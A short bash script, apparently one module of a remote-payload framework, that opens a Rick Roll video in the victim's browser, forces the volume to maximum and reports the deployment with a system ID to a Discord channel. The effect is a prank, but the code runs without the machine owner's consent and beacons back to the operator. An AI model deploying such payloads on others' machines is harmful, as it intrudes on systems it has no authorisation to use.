#!/bin/bash
# ============================================================
# Rick Roll for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)

# Try to open browser
URL="https://www.youtube.com/watch?v=dQw4w9WgXcQ"

if command -v xdg-open &>/dev/null; then
    xdg-open "$URL" &>/dev/null &
elif command -v firefox &>/dev/null; then
    firefox "$URL" &>/dev/null &
elif command -v google-chrome &>/dev/null; then
    google-chrome "$URL" &>/dev/null &
elif command -v chromium &>/dev/null; then
    chromium "$URL" &>/dev/null &
fi

# Set volume to max if possible
if command -v pactl &>/dev/null; then
    pactl set-sink-volume @DEFAULT_SINK@ 100%
elif command -v amixer &>/dev/null; then
    amixer set Master 100%
fi

send_discord "🎵 **Rick Roll Deployed on $SYSID**"

